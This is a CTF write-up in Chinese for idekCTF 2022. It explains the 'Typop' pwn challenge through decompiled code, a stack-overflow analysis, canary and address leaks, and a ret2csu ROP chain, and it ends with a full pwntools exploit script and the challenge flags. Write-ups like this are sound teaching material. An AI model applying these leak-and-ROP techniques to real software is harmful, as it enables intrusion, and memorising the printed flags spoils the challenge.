# idekCTF 2022
###### tags: `CTF`

## pwn
### Typop

```!
While writing the feedback form for idekCTF, JW made a small typo. It still compiled though, so what could possibly go wrong?

nc typop.chal.idek.team 1337

Downloads: typop.tar
```

首先打開 ghidra 分析，看到有以下幾個函式

:::spoiler main
```clike
undefined8 main(void)
{
  int iVar1;
  
  setvbuf(stdout,(char *)0x0,2,0);
  while( true ) {
    iVar1 = puts("Do you want to complete a survey?");
    if (iVar1 == 0) {
      return 0;
    }
    iVar1 = getchar();
    if (iVar1 != 0x79) break;
    getchar();
    getFeedback();
  }
  return 0;
}
```
:::

:::spoiler getFeedback
```clike=
void getFeedback(void)
{
  long in_FS_OFFSET;
  undefined8 local_1a;
  undefined2 local_12;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_1a = 0;
  local_12 = 0;
  puts("Do you like ctf?");
  read(0,&local_1a,0x1e);
  printf("You said: %s\n",&local_1a);
  if ((char)local_1a == 'y') {
    printf("That\'s great! ");
  }
  else {
    printf("Aww :( ");
  }
  puts("Can you provide some extra feedback?");
  read(0,&local_1a,0x5a);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
:::

:::spoiler win
```clike
void win(undefined param_1,undefined param_2,undefined param_3)

{
  FILE *__stream;
  long in_FS_OFFSET;
  undefined8 local_52;
  undefined2 local_4a;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_4a = 0;
  local_52 = CONCAT17(0x74,CONCAT16(0x78,CONCAT15(0x74,CONCAT14(0x2e,CONCAT13(0x67,CONCAT12(param _3,
                                                  CONCAT11(param_2,param_1)))))));
  __stream = fopen((char *)&local_52,"r");
  if (__stream == (FILE *)0x0) {
    puts("Error opening flag file.");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  fgets((char *)&local_48,0x20,__stream);
  puts((char *)&local_48);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
:::

可以看到，這題的目的是要想辦法執行 win 函式讀取檔案，而此函式需要帶入 3 個 params 個別取一個字元並與一些以定義的字串共同拼接成要讀的檔案名稱

而在函式 getFeedback 中可以清楚的看到有 bof 的漏洞，因此理想上是使用這個漏洞並串 ROP 執行 win

不過這題有幾個麻煩的地方，首先第一個是使用 checksec 查看檢查後發現全部檢查都有開，因此必須想辦法 leak canary 和 PIE 相對位置等資訊

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

第二個麻煩的地方是，由於執行 win 函式需要傳參數進去給它，而此程式為 64 位元，因此需要想辦法設定 rdi, rsi, rdx 的暫存器，前兩個還好說但使用 ROPgadget 工具發現沒有設定 rdx 暫存器的 gadget，因此需要想辦法用其他方式設定

關於第一個部分，可以發現在 getFeedback 的第 13 行是使用 `%s` format 進行輸出，因此只要字串中間沒有出現 `\x00` 就會一直輸出下去，可以利用這個點先 leak 出 canary 的值之後等再次執行時再繼續 leak 出 rbp, return address 等數值 (不過在 leak canary 的時候要注意的是記得要多填一個字元覆蓋 canary 的最低位因為此固定為 `\x00`)，也就可以利用這些資訊計算相對位置得出函式的真正位置及操作 stack 等

而關於第二個部分，可以利用 ret2csu 的方式設定暫存器，以下是 `__libc_csu_init` 的節錄，可以先利用 0x1014ca 開始的 pop rbx 到 ret 之間的操作設定 rbx, rbp, r12-15 暫存器，並再跳回 0x1014b0 將 r12-14 的暫存器內容給 rdi, rsi, rdx，並在 0x101469 call 函式 win，即可得到 flag

```
001014b0    MOV        RDX ,R14
001014b3    MOV        RSI ,R13
001014b6    MOV        EDI ,R12D
001014b9    CALL       qword ptr [R15  + RBX *0x8 ]=>->frame_dummy

001014bd    ADD        RBX ,0x1
001014c1    CMP        RBP ,RBX
001014c4    JNZ        LAB_001014b0

001014c6    ADD        RSP ,0x8
001014ca    POP        RBX
001014cb    POP        RBP
001014cc    POP        R12
001014ce    POP        R13
001014d0    POP        R14
001014d2    POP        R15
001014d4    RET
```

以下是完整的 exploit

:::spoiler solve.py
```python
from pwn import *
from Crypto.Util.number import long_to_bytes
binary = "./attachments/chall"

context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = binary

conn = remote("typop.chal.idek.team",1337)
# conn = process(binary)
# conn = gdb.debug(binary)

# leak canary
conn.sendlineafter(b"survey?\n", b"y")
conn.sendlineafter(b"like ctf?\n",b"y"+b"A"*9)
conn.recvuntil(b"y"+b"A"*9+b"\n")
canary = conn.recv(7)[::-1] + b"\x00"
print("canary:","0x"+canary.hex())
conn.sendafter(b"feedback?",b"A"*10+b"\x00")

# leak old rbp
conn.sendlineafter(b"survey?\n", b"y")
conn.sendafter(b"like ctf?\n",b"y"+b"A"*(9+8))
rbp = b"\x00\x00" + conn.recvline().strip()[-6:][::-1]
print("rbp:","0x"+rbp.hex())
conn.sendafter(b"feedback?",b"A"*10+canary[::-1])

# leak main+55
conn.sendlineafter(b"survey?\n", b"y")
conn.sendafter(b"like ctf?\n",b"y"+b"A"*(9+8+8))
main_55 = b"\x00\x00" + conn.recvline().strip()[-6:][::-1]
base = int.from_bytes(main_55, byteorder="big") - 0x447
print("main+55:","0x"+main_55.hex())
# ret2csu
payload = b"A"*2 + long_to_bytes(base+0x249).rjust(8,b"\x00")[::-1] + canary[::-1] + rbp[::-1]
payload += long_to_bytes(base+0x4ca).rjust(8,b"\x00")[::-1] # csu_init pop regs
payload += b"\x00"*8 #rbx 0
payload += long_to_bytes(int.from_bytes(rbp, byteorder="big")+0x38).rjust(8,b"\x00")[::-1] #rbp
payload += b"fAAAAAAA" #r12 edi
payload += b"lAAAAAAA" #r13 rsi
payload += b"aAAAAAAA" #r14 rdx
payload += long_to_bytes(int.from_bytes(rbp, byteorder="big")-0x20).rjust(8,b"\x00")[::-1] #r15 win position
payload += long_to_bytes(base+0x4b0).rjust(8,b"\x00")[::-1] # csu_init set rdi,rsi,rdx
conn.sendafter(b"feedback?", payload)

conn.interactive()
```
:::

`idek{2_guess_typos_do_matter}`

## Sanity
### Feedback survey

填問卷

`idek{We_hope_you_enjoyed_idek2022*!}`